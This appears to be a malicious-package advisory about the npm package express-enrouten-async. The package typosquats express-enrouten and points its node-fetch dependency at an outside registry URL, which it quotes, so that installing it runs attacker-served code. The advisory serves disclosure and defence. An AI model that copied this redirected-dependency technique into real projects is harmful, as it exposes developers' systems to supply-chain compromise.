summary: express-enrouten-async redirects node-fetch dependency to attacker-controlled registry
details: package.json declares the node-fetch dependency as a direct URL to a non-npm registry: "node-fetch": "https://registry.ctzbg.com/express-enrouten-async/node-fetch". On npm install, npm fetches whatever tarball that third-party host serves under the name node-fetch and installs it into the consumer's node_modules. index.js then calls require('node-fetch') at module load, executing the attacker-controlled tarball's code in the consumer's process. The contents at registry.ctzbg.com are mutable and outside npm's registry scanning. The package name is also a one-word-suffix typosquat of the legitimate krakenjs express-enrouten, and the visible source is a hollow stub: README advertises automatic route discovery, but index.js only registers two hardcoded routes (/ and /status). The advertised functionality is a cover; the real payload is the redirected dependency.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
